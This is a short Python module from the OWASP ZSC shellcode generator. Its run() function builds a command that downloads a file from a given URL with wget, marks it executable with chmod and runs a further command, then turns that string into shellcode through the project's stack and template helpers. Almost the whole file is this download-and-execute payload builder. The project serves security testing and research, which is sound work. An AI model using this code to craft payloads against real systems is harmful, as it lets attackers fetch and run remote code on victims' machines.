#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/Ali-Razmjoo/OWASP-ZSC
http://api.z3r0d4y.com/
https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]
shellcode template used : http://shell-storm.org/shellcode/files/shellcode-57.php
'''
from core import stack
from core import template
def run(url,filename,command):
	command = 'wget %s -O %s ; chmod +x %s ; %s' %(str(url),str(filename),str(filename),str(command)) 
	return template.sys(stack.generate(command.replace('[space]',' '),'%ecx','string'))
